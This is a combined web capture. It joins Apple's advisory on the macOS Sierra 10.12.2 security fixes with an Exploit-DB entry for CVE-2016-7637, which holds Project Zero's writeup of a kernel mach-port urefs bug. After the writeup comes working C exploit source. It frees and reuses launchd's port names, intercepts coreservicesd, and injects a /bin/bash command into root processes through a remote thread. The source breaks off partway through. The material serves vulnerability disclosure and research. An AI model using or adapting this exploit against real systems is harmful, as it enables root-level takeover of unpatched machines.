  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of macOS Sierra 10.12.2, Security Update 2016-003 El Capitan, and Security Update 2016-007 Yosemite

This document describes the security content of macOS Sierra 10.12.2, Security Update 2016-003 El Capitan, and Security Update 2016-007 Yosemite.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## macOS Sierra 10.12.2, Security Update 2016-003 El Capitan, and Security Update 2016-007 Yosemite

Released December 13, 2016

**apache\_mod\_php**

Available for: macOS Sierra 10.12.1

Impact: A remote attacker may cause an unexpected application termination or arbitrary code execution

Description: Multiple issues existed in PHP before 5.6.26. These were addressed by updating PHP to version 5.6.26.

CVE-2016-7411

CVE-2016-7412

CVE-2016-7413

CVE-2016-7414

CVE-2016-7416

CVE-2016-7417

CVE-2016-7418

**AppleGraphicsPowerManagement**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to cause a system denial of service

Description: A null pointer dereference was addressed through improved input validation.

CVE-2016-7609: daybreaker@Minionz working with Trend Micro's Zero Day Initiative

**Assets**

Available for: macOS Sierra 10.12.1

Impact: A local attacker may modify downloaded mobile assets

Description: A permissions issue existed in mobile assets. This issue was addressed through improved access restrictions.

CVE-2016-7628: Marcel Bresink of Marcel Bresink Software-Systeme

Entry updated December 15, 2016

**Audio**

Available for: macOS Sierra 10.12.1

Impact: Processing a maliciously crafted file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7658: Haohao Kong of Keen Lab (@keen\_lab) of Tencent

CVE-2016-7659: Haohao Kong of Keen Lab (@keen\_lab) of Tencent

**Bluetooth**

Available for: macOS Sierra 10.12.1, OS X El Capitan v10.11.6, and OS X Yosemite v10.10.5

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7596: Pekka Oikarainen, Matias Karhumaa and Marko Laakso of Synopsys Software Integrity Group

Entry updated December 14, 2016

**Bluetooth**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to cause a denial of service

Description: A null pointer dereference was addressed through improved input validation.

CVE-2016-7605: daybreaker of Minionz

**Bluetooth**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to execute arbitrary code with system privileges

Description: A type confusion issue was addressed through improved memory handling.

CVE-2016-7617: Radu Motspan working with Trend Micro's Zero Day Initiative, Ian Beer of Google Project Zero

**CoreCapture**

Available for: macOS Sierra 10.12.1 and OS X El Capitan v10.11.6

Impact: A local user may be able to cause a system denial of service

Description: A null pointer dereference was addressed through improved state management.

CVE-2016-7604: daybreaker of Minionz

Entry updated December 14, 2016

**CoreFoundation**

Available for: macOS Sierra 10.12.1

Impact: Processing malicious strings may lead to an unexpected application termination or arbitrary code execution

Description: A memory corruption issue existed in the processing of strings. This issue was addressed through improved bounds checking.

CVE-2016-7663: an anonymous researcher

**CoreGraphics**

Available for: macOS Sierra 10.12.1

Impact: Processing a maliciously crafted font file may lead to unexpected application termination

Description: A null pointer dereference was addressed through improved input validation.

CVE-2016-7627: TRAPMINE Inc. & Meysam Firouzi @R00tkitSMM

**CoreMedia External Displays**

Available for: macOS Sierra 10.12.1

Impact: A local application may be able to execute arbitrary code in the context of the mediaserver daemon

Description: A type confusion issue was addressed through improved memory handling.

CVE-2016-7655: Keen Lab working with Trend Micro’s Zero Day Initiative

**CoreMedia Playback**

Available for: macOS Sierra 10.12.1

Impact: Processing a maliciously crafted .mp4 file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7588: dragonltx of Huawei 2012 Laboratories

**CoreStorage**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to cause a system denial of service

Description: A null pointer dereference was addressed through improved input validation.

CVE-2016-7603: daybreaker@Minionz working with Trend Micro's Zero Day Initiative

**CoreText**

Available for: macOS Sierra 10.12.1

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

CVE-2016-7595: riusksk(泉哥) of Tencent Security Platform Department

**CoreText**

Available for: macOS Sierra 10.12.1

Impact: Processing a maliciously crafted string may lead to a denial of service

Description: An issue when rendering overlapping ranges was addressed through improved validation.

CVE-2016-7667: Nasser Al-Hadhrami (@fast\_hack), Saif Al-Hinai (welcom\_there) of Digital Unit (dgunit.com)

Entry added December 15, 2016

**curl**

Available for: macOS Sierra 10.12.1

Impact: An attacker in a privileged network position may be able to leak sensitive user information

Description: Multiple issues existed in curl. These issues were addressed by updating to curl version 7.51.0.

CVE-2016-5419

CVE-2016-5420

CVE-2016-5421

CVE-2016-7141

CVE-2016-7167

CVE-2016-8615

CVE-2016-8616

CVE-2016-8617

CVE-2016-8618

CVE-2016-8619

CVE-2016-8620

CVE-2016-8621

CVE-2016-8622

CVE-2016-8623

CVE-2016-8624

CVE-2016-8625

**Directory Services**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to gain root privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7633: Ian Beer of Google Project Zero

**Disk Images**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7616: daybreaker@Minionz working with Trend Micro's Zero Day Initiative

**FontParser**

Available for: macOS Sierra 10.12.1

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

CVE-2016-4691: riusksk(泉哥) of Tencent Security Platform Department

**Foundation**

Available for: macOS Sierra 10.12.1

Impact: Opening a maliciously crafted .gcx file may lead to unexpected application termination or arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7618: riusksk(泉哥) of Tencent Security Platform Department

**Grapher**

Available for: macOS Sierra 10.12.1

Impact: Opening a maliciously crafted .gcx file may lead to unexpected application termination or arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7622: riusksk(泉哥) of Tencent Security Platform Department

**ICU**

Available for: macOS Sierra 10.12.1

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7594: André Bargull

**ImageIO**

Available for: macOS Sierra 10.12.1

Impact: A remote attacker may be able to leak memory

Description: An out-of-bounds read was addressed through improved bounds checking.

CVE-2016-7643: Yangkang (@dnpushme) of Qihoo360 Qex Team

**Intel Graphics Driver**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7602: daybreaker@Minionz working with Trend Micro's Zero Day Initiative

**IOFireWireFamily**

Available for: macOS Sierra 10.12.1

Impact: A local attacker may be able to read kernel memory

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7608: Brandon Azad

**IOAcceleratorFamily**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to determine kernel memory layout

Description: A shared memory issue was addressed through improved memory handling.

CVE-2016-7624 : Qidan He (@flanker\_hqd) from KeenLab working with Trend Micro's Zero Day Initiative

**IOHIDFamily**

Available for: macOS Sierra 10.12.1

Impact: A local application with system privileges may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7591: daybreaker of Minionz

**IOKit**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to read kernel memory

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7657: Keen Lab working with Trend Micro’s Zero Day Initiative

**IOKit**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to determine kernel memory layout

Description: A shared memory issue was addressed through improved memory handling.

CVE-2016-7625: Qidan He (@flanker\_hqd) from KeenLab working with Trend Micro's Zero Day Initiative

**IOKit**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to determine kernel memory layout

Description: A shared memory issue was addressed through improved memory handling.

CVE-2016-7714: Qidan He (@flanker\_hqd) from KeenLab working with Trend Micro's Zero Day Initiative

Entry added January 25, 2017

**IOSurface**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to determine kernel memory layout

Description: A shared memory issue was addressed through improved memory handling.

CVE-2016-7620: Qidan He (@flanker\_hqd) from KeenLab working with Trend Micro's Zero Day Initiative

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2016-7606: @cocoahuke, Chen Qin of Topsec Alpha Team (topsec.com)

CVE-2016-7612: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to read kernel memory

Description: An insufficient initialization issue was addressed by properly initializing memory returned to user space.

CVE-2016-7607: Brandon Azad

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to cause a system denial of service

Description: A denial of service issue was addressed through improved memory handling.

CVE-2016-7615: The UK's National Cyber Security Centre (NCSC)

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to cause an unexpected system termination or arbitrary code execution in the kernel

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7621: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to gain root privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7637: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: A local application with system privileges may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7644: Ian Beer of Google Project Zero

**Kernel**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to cause a denial of service

Description: A denial of service issue was addressed through improved memory handling.

CVE-2016-7647: Lufeng Li of Qihoo 360 Vulcan Team

Entry added May 17, 2017

**kext tools**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7629: @cocoahuke

**libarchive**

Available for: macOS Sierra 10.12.1

Impact: A local attacker may be able to overwrite existing files

Description: A validation issue existed in the handling of symlinks. This issue was addressed through improved validation of symlinks.

CVE-2016-7619: an anonymous researcher

**LibreSSL**

Available for: macOS Sierra 10.12.1 and OS X El Capitan v10.11.6

Impact: An attacker with a privileged network position may be able to cause a denial of service

Description: A denial of service issue in unbounded OCSP growth was addressed through improved memory handling.

CVE-2016-6304

Entry updated December 14, 2016

**OpenLDAP**

Available for: macOS Sierra 10.12.1

Impact: An attacker may be able to exploit weaknesses in the RC4 cryptographic algorithm

Description: RC4 was removed as a default cipher.

CVE-2016-1777: Pepi Zawodsky

**OpenPAM**

Available for: macOS Sierra 10.12.1

Impact: A local unprivileged user may gain access to privileged applications

Description: PAM authentication within sandboxed applications failed insecurely. This was addressed with improved error handling.

CVE-2016-7600: Perette Barella of DeviousFish.com

**OpenSSL**

Available for: macOS Sierra 10.12.1

Impact: An application may be able to execute arbitrary code

Description: An overflow issue existed in MDC2\_Update(). This issue was addressed through improved input validation.

CVE-2016-6303

**OpenSSL**

Available for: macOS Sierra 10.12.1

Impact: An attacker with a privileged network position may be able to cause a denial of service

Description: A denial of service issue in unbounded OCSP growth was addressed through improved memory handling.

CVE-2016-6304

**Power Management**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to gain root privileges

Description: An issue in mach port name references was addressed through improved validation.

CVE-2016-7661: Ian Beer of Google Project Zero

**Security**

Available for: macOS Sierra 10.12.1

Impact: An attacker may be able to exploit weaknesses in the 3DES cryptographic algorithm

Description: 3DES was removed as a default cipher.

CVE-2016-4693: Gaëtan Leurent and Karthikeyan Bhargavan from INRIA Paris

**Security**

Available for: macOS Sierra 10.12.1

Impact: An attacker in a privileged network position may be able to cause a denial of service

Description: A validation issue existed in the handling of OCSP responder URLs. This issue was addressed by verifying OCSP revocation status after CA validation and limiting the number of OCSP requests per certificate.

CVE-2016-7636: Maksymilian Arciemowicz (cxsecurity.com)

**Security**

Available for: macOS Sierra 10.12.1

Impact: Certificates may be unexpectedly evaluated as trusted

Description: A certificate evaluation issue existed in certificate validation. This issue was addressed through additional validation of certificates.

CVE-2016-7662: Apple

**syslog**

Available for: macOS Sierra 10.12.1

Impact: A local user may be able to gain root privileges

Description: An issue in mach port name references was addressed through improved validation.

CVE-2016-7660: Ian Beer of Google Project Zero

**Wi-Fi**

Available for: macOS Sierra 10.12.1

Impact: A malicious local user may be able to view sensitive network configuration information

Description: Network configuration was unexpectedly global. This issue was addressed by moving sensitive network configuration to per-user settings.

CVE-2016-7761: Peter Loos, Karlsruhe, Germany

Entry added January 24, 2017

**xar**

Available for: macOS Sierra 10.12.1

Impact: Opening a maliciously crafted archive may lead to arbitrary code execution

Description: The use of an uninitialized variable was addressed through improved validation.

CVE-2016-7742: Gareth Evans of Context Information Security

Entry added January 10, 2017
macOS Sierra 10.12.2, Security Update 2016-003 El Capitan, and Security Update 2016-007 Yosemite includes the security content of [Safari 10.0.2](https://support.apple.com/kb/HT207421).

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 06, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of macOS Sierra 10.12.2, Security Update 2016-003 El Capitan, and Security Update 2016-007 Yosemite

[United States](https://support.apple.com/en-us/103801/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from www.exploit-db.com_3c122025_20250125_162528.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Apple macOS < 10.12.2 / iOS < 10.2 - Broken Kernel Mach Port Name uref Handling Privileged Port Name Replacement Privilege Escalation

#### EDB-ID:

###### 40957

#### CVE:

###### [2016-7637](https://nvd.nist.gov/vuln/detail/CVE-2016-7637)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [macOS](/?platform=macos)

#### Date:

###### 2016-12-22

---

**Vulnerable App:**

```
/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=959

Proofs of Concept:
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40957.zip

When sending and receiving mach messages from userspace there are two important kernel objects; ipc_entry and
ipc_object.

ipc_entry's are the per-process handles or names which a process uses to refer to a particular ipc_object.

ipc_object is the actual message queue (or kernel object) which the port refers to.

ipc_entrys have a pointer to the ipc_object they are a handle for along with the ie_bits field which contains
the urefs and capacility bits for this name/handle (whether this is a send right, receive right etc.)

  struct ipc_entry {
    struct ipc_object *ie_object;
    ipc_entry_bits_t ie_bits;
    mach_port_index_t ie_index;
    union {
      mach_port_index_t next;   /* next in freelist, or...  */
      ipc_table_index_t request;  /* dead name request notify */
    } index;
  };

#define IE_BITS_UREFS_MASK  0x0000ffff  /* 16 bits of user-reference */
#define IE_BITS_UREFS(bits) ((bits) & IE_BITS_UREFS_MASK)

The low 16 bits of the ie_bits field are the user-reference (uref) count for this name.

Each time a new right is received by a process, if it already had a name for that right the kernel will
increment the urefs count. Userspace can also arbitrarily control this reference count via mach_port_mod_refs
and mach_port_deallocate. When the reference count hits 0 the entry is free'd and the name can be re-used to
name another right.

ipc_right_copyout is called when a right will be copied into a space (for example by sending a port right in a mach
message to another process.) Here's the code to handle the sending of a send right:

    case MACH_MSG_TYPE_PORT_SEND:
        assert(port->ip_srights > 0);

        if (bits & MACH_PORT_TYPE_SEND) {
            mach_port_urefs_t urefs = IE_BITS_UREFS(bits);

            assert(port->ip_srights > 1);
            assert(urefs > 0);
            assert(urefs < MACH_PORT_UREFS_MAX);

            if (urefs+1 == MACH_PORT_UREFS_MAX) {
                if (overflow) {
                    /* leave urefs pegged to maximum */     <---- (1)

                    port->ip_srights--;
                    ip_unlock(port);
                    ip_release(port);
                    return KERN_SUCCESS;
                }

                ip_unlock(port);
                return KERN_UREFS_OVERFLOW;
            }
            port->ip_srights--;
            ip_unlock(port);
            ip_release(port);

     ...

        entry->ie_bits = (bits | MACH_PORT_TYPE_SEND) + 1;  <---- (2)
        ipc_entry_modified(space, name, entry);
        break;

If copying this right into this space would cause that right's name's urefs count in that space to hit 0xffff
then (if overflow is true) we reach the code at (1) which claims in the comment that it will leave urefs pegged at maximum.
This branch doesn't increase the urefs but still returns KERN_SUCCESS. Almost all callers pass overflow=true.

The reason for this "pegging" was probably not to prevent the reference count from becoming incorrect but rather because
at (2) if the urefs count wasn't capped the reference count would overflow the 16-bit bitfield into the capability bits.

The issue is that the urefs count isn't "pegged" at all. I would expect "pegged" to mean that the urefs count will now stay at 0xfffe
and cannot be decremented - leaking the name and associated ipc_object but avoiding the possibilty of a name being over-released.

In fact all that the "peg" does is prevent the urefs count from exceeding 0xfffe; it doesn't prevent userspace from believing
it has more urefs than that (by eg making the copyout's fail.)

What does this actually mean?

Let's consider the behaviour of mach_msg_server or dispatch_mig_server. They receive mach service messages in a loop and if the message
they receieved didn't corrispond to the MIG schema they pass that received message to mach_msg_destroy. Here's the code where mach_msg_destroy
destroys an ool_ports_descriptor_t:

    case MACH_MSG_OOL_PORTS_DESCRIPTOR : {
      mach_port_t                 *ports;
      mach_msg_ool_ports_descriptor_t *dsc;
      mach_msg_type_number_t      j;

      /*
       * Destroy port rights carried in the message
       */
      dsc = &saddr->ool_ports;
      ports = (mach_port_t *) dsc->address;
      for (j = 0; j < dsc->count; j++, ports++)  {
          mach_msg_destroy_port(*ports, dsc->disposition); // calls mach_port_deallocate
      }
    ...

This will call mach_port_deallocate for each ool_port name received.

If we send such a service a mach message with eg 0x20000 copies of the same port right as ool ports the ipc_entry for that name will actually only have
0xfffe urefs. After 0xfffe calls to mach_port_deallocate the urefs will hit 0 and the kernel will free the ipc_entry and mark that name as free. From this
point on the name can be re-used to name another right (for example by sending another message received on another thread) but the first thread will
still call mach_port_deallocate 0x10002 times on that name.

This leads to something like a use-after-deallocate of the mach port name - strictly a userspace bug (there's no kernel memory corruption etc here) but
caused by a kernel bug.

** Doing something interesting **

Here's one example of how this bug could be used to elevate privileges/escape from sandboxes:

All processes have send rights to the bootstrap server (launchd). When they wish to lookup a service they send messages to this port.

Process A and B run as the same user; A is sandboxed, B isn't. B implements a mach service and A has looked up a send right to the service vended by
B via launchd.

Process A builds a mach message with 0x10000 ool send rights to the bootstrap server and sends this message to B. B receives the message inside mach_msg_server
(or a similar function.) When the kernel copies out this message to process B it sees that B already has a name for the boostrap port so increments the urefs count
for that name for each ool port in the message - there are 0x10000 of those but the urefs count stops incrementing at 0xfffe (but the copy outs still succeed and
process B sees 0x10000 copies of the same name in the received ool ports descriptor.)

Process B sees that the message doesn't match its MIG schema and passes it to mach_msg_destroy, which calls mach_port_deallocate 0x10000 times, destroying the rights
carried in the ool ports; since the bootstrap_port name only has 0xfffe urefs after the 0xfffe'th mach_port_deallocate this actually frees the boostrap_port's
name in process B meaning that it can be reused to name another port right. The important thing to notice here is that process B still believes that the name names
a send right to launchd (and it will just read the name from the bootstrap_port global variable.)

Process A can then allocate new mach port receive rights and send another message containing send rights to these new ports to process B and try to get the old name
reused to name one of these send rights - now when process B tries to communicate with launchd it will instead be communicating with process A.

Turning this into code execution outside of the sandbox would depend on what you could transativly do by impersonating launchd in such a fashion but it's surely possible.

Another approach with a more clear path to code execution would be to replace the IOKit master device port using the same technique - there's then a short path to getting
the target's task port if it tries to open a new IOKit user client since it will pass its task port to io_service_open_extended.

** poc **

This PoC just demonstrates the ability to cause the boostrap port name to be freed in another process - this should be proof enough that there's a very serious bug here.

Use a kernel debugger and showtaskrights to see that sharingd's name for the bootstrap port has been freed but that in userspace the bootstrap_port global is still the old name.

I will work on a full exploit but it's a non-trivial task! Please reach out to me ASAP if you require any futher information about the impact of this bug.

Tested on MacOS Sierra 10.12 (16A323)

################################################################################

Exploit attached :)

The challenge to exploiting this bug is getting the exact same port name reused
in an interesting way.

This requires us to dig in a bit to exacly what a port name is, how they're allocated
and under what circumstances they'll be reused.

Mach ports are stored in a flat array of ipc_entrys:

  struct ipc_entry {
    struct ipc_object *ie_object;
    ipc_entry_bits_t ie_bits;
    mach_port_index_t ie_index;
    union {
      mach_port_index_t next;   /* next in freelist, or...  */
      ipc_table_index_t request;  /* dead name request notify */
    } index;
  };

mach port names are made up of two fields, the upper 24 bits are an index into the ipc_entrys table
and the lower 8 bits are a generation number. Each time an entry in the ipc_entrys table is reused
the generation number is incremented. There are 64 generations, so after an entry has been reallocated
64 times it will have the same generation number.

The generation number is checked in ipc_entry_lookup:

  if (index <  space->is_table_size) {
                entry = &space->is_table[index];
    if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||
        IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE)
      entry = IE_NULL;
  }

here entry is the ipc_entry struct in the kernel and name is the user-supplied mach port name.

Entry allocation:
The ipc_entry table maintains a simple LIFO free list for entries; if this list is free the table will
be grown. The table is never shrunk.

Reliably looping mach port names:
To exploit this bug we need a primitive that allows us to loop a mach port's generation number around.

After triggering the urefs bug to free the target mach port name in the target process we immediately
send a message with N ool ports (with send rights) and no reply port. Since the target port was the most recently
freed it will be at the head of the freelist and will be reused to name the first of the ool ports
contained in the message (but with an incremented generation number.)
Since this message is not expected by the service (in this case we send an
invalid XPC request to launchd) it will get passed to mach_msg_destroy which will pass each of
the ports to mach_port_deallocate freeing them in the order in which they appear in the message. Since the
freed port was reused to name the first ool port it will be the first to be freed. This will push the name
N entries down the freelist.

We then send another 62 of these looper messages but with 2N ool ports. This has the effect of looping the generation
number of the target port around while leaving it in approximately the middle of the freelist. The next time the target entry
in the table is allocated it will have exactly the same mach port name as the original target right we
triggered the urefs bug on.

For this PoC I target the send right to com.apple.CoreServices.coreservicesd which launchd has.

I look up the coreservicesd service in launchd then use the urefs bug to free launchd's send right and use the
looper messages to spin the generation number round. I then register a large number of dummy services
with launchd so that one of them reuses the same mach port name as launchd thinks the coreservicesd service has.

Now when any process looks up com.apple.CoreServices.coreservicesd launchd will actually send them a send right
to one of my dummy services :)

I add all those dummy services to a portset and use that recieve right and the legitimate coreservicesd send right
I still have to MITM all these new connections to coreservicesd. I look up a few root services which send their
task ports to coreservices and grab these task ports in the mitm and start a new thread in the uid 0 process to run a shell command as root :)

The whole flow seems to work about 50% of the time.
*/

// ianbeer
// build: clang -o service_mitm service_mitm.c

#if 0
Exploit for the urefs saturation bug

The challenge to exploiting this bug is getting the exact same port name reused
in an interesting way.

This requires us to dig in a bit to exacly what a port name is, how they're allocated
and under what circumstances they'll be reused.

Mach ports are stored in a flat array of ipc_entrys:

	struct ipc_entry {
		struct ipc_object *ie_object;
		ipc_entry_bits_t ie_bits;
		mach_port_index_t ie_index;
		union {
			mach_port_index_t next;		/* next in freelist, or...  */
			ipc_table_index_t request;	/* dead name request notify */
		} index;
	};

mach port names are made up of two fields, the upper 24 bits are an index into the ipc_entrys table
and the lower 8 bits are a generation number. Each time an entry in the ipc_entrys table is reused
the generation number is incremented. There are 64 generations, so after an entry has been reallocated
64 times it will have the same generation number.

The generation number is checked in ipc_entry_lookup:

	if (index <  space->is_table_size) {
                entry = &space->is_table[index];
		if (IE_BITS_GEN(entry->ie_bits) != MACH_PORT_GEN(name) ||
		    IE_BITS_TYPE(entry->ie_bits) == MACH_PORT_TYPE_NONE)
			entry = IE_NULL;
	}

here entry is the ipc_entry struct in the kernel and name is the user-supplied mach port name.

Entry allocation:
The ipc_entry table maintains a simple LIFO free list for entries; if this list is free the table will
be grown. The table is never shrunk.

Reliably looping mach port names:
To exploit this bug we need a primitive that allows us to loop a mach port's generation number around.

After triggering the urefs bug to free the target mach port name in the target process we immediately
send a message with N ool ports (with send rights) and no reply port. Since the target port was the most recently
freed it will be at the head of the freelist and will be reused to name the first of the ool ports
contained in the message (but with an incremented generation number.)
Since this message is not expected by the service (in this case we send an
invalid XPC request to launchd) it will get passed to mach_msg_destroy which will pass each of
the ports to mach_port_deallocate freeing them in the order in which they appear in the message. Since the
freed port was reused to name the first ool port it will be the first to be freed. This will push the name
N entries down the freelist.

We then send another 62 of these looper messages but with 2N ool ports. This has the effect of looping the generation
number of the target port around while leaving it in approximately the middle of the freelist. The next time the target entry
in the table is allocated it will have exactly the same mach port name as the original target right we
triggered the urefs bug on.

For this PoC I target the send right to com.apple.CoreServices.coreservicesd which launchd has.

I look up the coreservicesd service in launchd then use the urefs bug to free launchd's send right and use the
looper messages to spin the generation number round. I then register a large number of dummy services
with launchd so that one of them reuses the same mach port name as launchd thinks the coreservicesd service has.

Now when any process looks up com.apple.CoreServices.coreservicesd launchd will actually send them a send right
to one of my dummy services :)

I add all those dummy services to a portset and use that recieve right and the legitimate coreservicesd send right
I still have to MITM all these new connections to coreservicesd. I look up a few root services which send their
task ports to coreservices and grab these task ports in the mitm and start a new thread in the uid 0 process to run a shell command as root :)

The whole flow seems to work about 50% of the time.
#endif

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libproc.h>
#include <pthread.h>

#include <servers/bootstrap.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

void run_command(mach_port_t target_task, char* command) {
  kern_return_t err;

  size_t command_length = strlen(command) + 1;
  size_t command_page_length = ((command_length + 0xfff) >> 12) << 12;
  command_page_length += 1; // for the stack

  // allocate some memory in the task
  mach_vm_address_t command_addr = 0;
  err = mach_vm_allocate(target_task,
                         &command_addr,
                         command_page_length,
                         VM_FLAGS_ANYWHERE);

  if (err != KERN_SUCCESS) {
    printf("mach_vm_allocate: %s\n", mach_error_string(err));
    return;
  }

  printf("allocated command at %llx\n", command_addr);
  uint64_t bin_bash = command_addr;
  uint64_t dash_c = command_addr + 0x10;
  uint64_t cmd = command_addr + 0x20;
  uint64_t argv = command_addr + 0x800;

  uint64_t argv_contents[] = {bin_bash, dash_c, cmd, 0};

  err = mach_vm_write(target_task,
                      bin_bash,
                      (mach_vm_offset_t)"/bin/bash",
                      strlen("/bin/bash") + 1);

  err = mach_vm_write(target_task,
                      dash_c,
                      (mach_vm_offset_t)"-c",
                      strlen("-c") + 1);

  err = mach_vm_write(target_task,
                      cmd,
                      (mach_vm_offset_t)command,
                      strlen(command) + 1);

  err = mach_vm_write(target_task,
                      argv,
                      (mach_vm_offset_t)argv_contents,
                      sizeof(argv_contents));

  if (err != KERN_SUCCESS) {
    printf("mach_vm_write: %s\n", mach_error_string(err));
    return;
  }

  // create a new thread:
  mach_port_t new_thread = MACH_PORT_NULL;
  x86_thread_state64_t state;
  mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;

  memset(&state, 0, sizeof(state));

  // the minimal register state we require:
  state.__rip = (uint64_t)execve;
  state.__rdi = (uint64_t)bin_bash;
  state.__rsi = (uint64_t)argv;
  state.__rdx = (uint64_t)0;

  err = thread_create_running(target_task,
                              x86_THREAD_STATE64,
                              (thread_state_t)&state,
                              stateCount,
                              &new_thread);

  if (err != KERN_SUCCESS) {
    printf("thread_create_running: %s\n", mach_error_string(err));
    return;
  }

  printf("done?\n");
}

mach_port_t lookup(char* name) {
  mach_port_t service_port = MACH_PORT_NULL;
  kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", name);
    return MACH_PORT_NULL;
  }

  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return MACH_PORT_NULL;
  }
  return service_port;
}

/*
host_service is the service which is hosting the port we want to free (eg the bootstrap port)
target_port is a send-right to the port we want to get free'd in the host service (eg another service port in launchd)
*/

struct ool_msg  {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_ports_descriptor_t ool_ports;
};

// this msgh_id is an XPC message
uint32_t msgh_id_to_get_destroyed = 0x10000000;

void do_free(mach_port_t host_service, mach_port_t target_port) {
  kern_return_t err;

  int port_count = 0x10000;
  mach_port_t* ports = malloc(port_count * sizeof(mach_port_t));
  for (int i = 0; i < port_count; i++) {
    ports[i] = target_port;
  }

  // build the message to free the target port name
  struct ool_msg* free_msg = malloc(sizeof(struct ool_msg));
  memset(free_msg, 0, sizeof(struct ool_msg));

  free_msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  free_msg->hdr.msgh_size = sizeof(struct ool_msg);
  free_msg->hdr.msgh_remote_port = host_service;
  free_msg->hdr.msgh_local_port = MACH_PORT_NULL;
